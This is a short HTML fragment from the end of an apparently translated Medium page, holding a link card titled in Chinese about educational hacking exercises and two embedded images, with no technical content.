translated">关于黑客的教育演练。</h3></div><div class="px l"><p class="bd b dl z fp pu fr fs pv fu fw dk translated">medium.com</p></div></div><div class="py l"><div class="qe l qa qb qc py qd lb pp"/></div></div></a></div><figure class="ks kt ku kv gt kw gh gi paragraph-image"><div class="gh gi qf"><img src="../Images/8ebced9b1ab1e809e496270fbac6eecd.png" data-original-src="https://miro.medium.com/v2/resize:fit:2/format:webp/1*406sUJmARZjFL1y78ozXgQ.png"/></div></figure><figure class="ks kt ku kv gt kw gh gi paragraph-image"><div class="gh gi qf"><img src="../Images/8ebced9b1ab1e809e496270fbac6eecd.png" data-original-src="https://miro.medium.com/v2/resize:fit:2/format:webp/1*406sUJmARZjFL1y78ozXgQ.png"/></div></figure></div></div>    
</body>
</html>